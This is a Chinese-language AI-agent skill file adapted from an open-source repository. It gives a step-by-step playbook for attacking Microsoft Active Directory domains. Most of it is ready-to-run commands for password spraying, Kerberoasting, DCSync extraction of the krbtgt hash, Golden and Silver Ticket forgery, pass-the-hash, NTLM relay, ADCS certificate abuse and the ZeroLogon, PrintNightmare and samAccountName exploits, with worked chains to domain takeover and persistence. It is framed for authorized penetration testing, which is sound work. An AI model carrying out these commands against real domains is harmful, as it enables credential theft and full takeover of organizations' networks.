---
name: active-directory-attacks
title: Active Directory 攻击技术
description: 当在授权红队/渗透测试中评估 Microsoft AD 域环境时使用；做侦察、凭据获取、Kerberos 票据攻击、横向移动到提权直至域控接管，产出枚举数据、哈希/票据与攻陷路径；不适用于未授权目标、非 AD/通用网络渗透、防御加固本身。触发词：Active Directory、Kerberoasting、DCSync、BloodHound、Golden Ticket、NTLM Relay
domain: 安全/appsec
triggers: [Active Directory 攻击, AD 域渗透, Kerberoasting, AS-REP Roasting, DCSync, Pass-the-Hash, Golden Ticket, Silver Ticket, BloodHound, NTLM Relay, Responder, ntlmrelayx, Impacket, Mimikatz, Rubeus, CrackMapExec, 密码喷洒, ZeroLogon, PrintNightmare, ADCS ESC1, certipy, 域控接管, krbtgt]
tags: [安全, appsec, 红队, 渗透测试, active-directory, kerberos, 凭据攻击, 横向移动, 提权]
level: 精通
status: stable
agents: [claude-code, codex, cursor, gemini-cli]
tools: [Impacket, Mimikatz, BloodHound, SharpHound, Rubeus, CrackMapExec, PowerView, Responder, ntlmrelayx, certipy, kerbrute, hashcat, secretsdump]
requires: []
related: [linux-privilege-escalation, penetration-testing-methodology, cloud-penetration-testing, red-team-recon]
combines_with: [red-team-recon, penetration-testing-methodology, wireshark-traffic-analysis]
license: MIT
source: sickn33/antigravity-awesome-skills
source_license: MIT
---
> 仅限授权使用：只能在获得授权的安全评估、防御验证或受控教学环境中使用本技能。

## 何时使用

需要对 Microsoft Active Directory 域环境做攻击面评估时使用，覆盖：域侦察、凭据获取、Kerberos 票据攻击、横向移动、提权、域控接管与持久化。

适用前置条件：
- Kali Linux 或 Windows 攻击平台。
- 多数攻击需要一个有效的域用户凭据。
- 可访问域控（DC）的网络连通性。
- 工具链：Impacket、Mimikatz、BloodHound、Rubeus、CrackMapExec、PowerView、Responder、certipy。

不该用的边界：
- 未取得书面授权的目标——一律不可执行。
- 非 AD 场景（通用 Web/主机渗透、云原生 IAM）——换用对应技能。
- 目标是「加固/检测防御」而非攻击验证时——本技能只产出攻击视角，需结合蓝队基线。
- 生产环境中可能触发账户锁定、修改 AD 对象的动作——未经批准不要执行。

产物：域枚举数据、提取的凭据与哈希、可用于冒充的 Kerberos 票据、域管理员权限、攻陷路径图与持久化机制。

## 步骤

1. Kerberos 时钟同步：所有 Kerberos 攻击前先校时（容差 ±5 分钟）。
2. BloodHound 侦察：收集器跑全量数据，导入后可视化攻陷路径。
3. PowerView 枚举：摸清域信息、用户、组、本地管理员访问与会话。
4. 凭据攻击：密码喷洒、Kerberoasting、AS-REP Roasting、DCSync 拿哈希。
5. 票据攻击：Pass-the-Hash / Pass-the-Ticket（Golden/Silver Ticket）/ OverPass-the-Hash 横向与提权。
6. 中继 / CVE：在签名缺失或未打补丁场景下用 NTLM Relay、ADCS、ZeroLogon 等扩大战果。
7. 全程记录所有被攻陷账户与遗留的票据/机器账户，便于清理。

## 指令

时钟同步（Kerberos 前置）：
```bash
nmap -sT 10.10.10.10 -p445 --script smb2-time   # 检测时钟偏移
sudo date -s "14 APR 2024 18:25:16"               # Linux 改时间
net time /domain /set                             # Windows 同步
faketime -f '+8h' <command>                        # 不改系统时间伪造
```

BloodHound 收集：
```bash
neo4j console; bloodhound --no-sandbox
.\SharpHound.exe -c All                            # Windows 收集器
bloodhound-python -u 'user' -p 'password' -d domain.local -ns 10.10.10.10 -c all
```

PowerView 关键枚举：
```powershell
Get-NetDomain; Get-DomainSID; Get-NetDomainController
Get-NetGroupMember -GroupName "Domain Admins"
Find-LocalAdminAccess -Verbose
Invoke-UserHunter -Stealth
```

密码喷洒（注意锁定阈值）：
```bash
./kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt Password123
crackmapexec smb 10.10.10.10 -u users.txt -p 'Password123' --continue-on-success
```

Kerberoasting（离线爆破）：
```bash
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request -outputfile hashes.txt
.\Rubeus.exe kerberoast /outfile:hashes.txt
hashcat -m 13100 hashes.txt rockyou.txt
```

AS-REP Roasting（针对禁用预认证账户）：
```bash
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat
hashcat -m 18200 hashes.txt rockyou.txt
```

DCSync（需 Replicating Directory Changes 权限）：
```bash
secretsdump.py domain.local/admin:password@10.10.10.10 -just-dc-user krbtgt
# Mimikatz: lsadump::dcsync /domain:domain.local /user:krbtgt
```

Golden Ticket（用 krbtgt 哈希伪造 TGT）：
```powershell
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:HASH /id:500 /ptt
```
```bash
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-xxx -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass domain.local/Administrator@dc.domain.local
```

Silver Ticket（伪造指定服务 TGS）：
```powershell
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:cifs /rc4:SERVICE_HASH /ptt
```

Pass-the-Hash / OverPass-the-Hash：
```bash
psexec.py domain.local/Administrator@10.10.10.10 -hashes :NTHASH
crackmapexec smb 10.10.10.10 -u Administrator -H NTHASH -d domain.local
getTGT.py domain.local/user -hashes :NTHASH; export KRB5CCNAME=user.ccache
.\Rubeus.exe asktgt /user:user /rc4:NTHASH /ptt
```

NTLM 中继（先确认 SMB 签名缺失）：
```bash
crackmapexec smb 10.10.10.0/24 --gen-relay-list targets.txt   # 找未签名目标
responder -I eth0 -wrf                                          # 关掉 SMB/HTTP 以便中继
ntlmrelayx.py -tf targets.txt -smb2support
ntlmrelayx.py -t ldaps://dc.domain.local -wh attacker-wpad --delegate-access  # LDAP 委派
```

ADCS 攻击：
```bash
certipy find -u user@domain.local -p password -dc-ip 10.10.10.10                              # 找漏洞模板
certipy req -u user@domain.local -p password -ca CA-NAME -target dc.domain.local -template VulnTemplate -upn administrator@domain.local  # ESC1
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController  # ESC8
```

关键 CVE：
```bash
# ZeroLogon (CVE-2020-1472)：先检测，利用后务必恢复密码！
crackmapexec smb 10.10.10.10 -u '' -p '' -M zerologon
python3 cve-2020-1472-exploit.py DC01 10.10.10.10
secretsdump.py -just-dc domain.local/DC01\$@10.10.10.10 -no-pass
python3 restorepassword.py domain.local/DC01@DC01 -target-ip 10.10.10.10 -hexpass HEXPASSWORD
# PrintNightmare (CVE-2021-1675)
rpcdump.py @10.10.10.10 | grep 'MS-RPRN'
# samAccountName 欺骗 (CVE-2021-42278/42287)
python3 sam_the_admin.py "domain.local/user:password" -dc-ip 10.10.10.10 -shell
```

## 示例

示例 1 - 经 Kerberoasting 拿下域：
```bash
GetUserSPNs.py domain.local/lowpriv:password -dc-ip 10.10.10.10 -request -outputfile tgs.txt
hashcat -m 13100 tgs.txt rockyou.txt
psexec.py domain.local/svc_admin:CrackedPassword@10.10.10.10
```

示例 2 - NTLM 中继到 LDAP（配合 PrinterBug 触发认证，再做 RBCD）：
```bash
ntlmrelayx.py -t ldaps://dc.domain.local --delegate-access
python3 printerbug.py domain.local/user:pass@target 10.10.10.12
# 利用创建出的机器账户实施基于资源的约束委派（RBCD）攻击
```

## 注意事项

必须做：
- Kerberos 攻击前与 DC 同步时间。
- 多数攻击需具备有效域凭据。
- 记录所有被攻陷的账户。

禁止做：
- 过量密码喷洒导致账户锁定。
- 未经批准修改生产 AD 对象。
- 留下 Golden Ticket 而不做记录。

应当做：
- 用 BloodHound 发现攻陷路径。
- 中继攻击前检查 SMB 签名状态。
- 利用 CVE 前核实补丁级别。

常见故障排查：
- 时钟偏移过大 → 与 DC 同步或用 faketime。
- Kerberoasting 返回空 → 无配置 SPN 的服务账户。
- DCSync 拒绝访问 → 缺 Replicating Directory Changes 权限。
- NTLM 中继失败 → 检查 SMB 签名，改投 LDAP 目标。
- BloodHound 数据为空 → 确认收集器用对了凭据。

## 互见

- 委派攻击、GPO 滥用、RODC 攻击、SCCM/WSUS 投递、ADCS 深入利用、信任关系、Linux 与 AD 集成等进阶内容，参见源仓库 references/advanced-attacks.md。
- 安全/appsec 域内的中继、凭据爆破、横向移动相关技能可配合使用。

---

采编自 sickn33/antigravity-awesome-skills（MIT 许可证），原作者 zebbern。
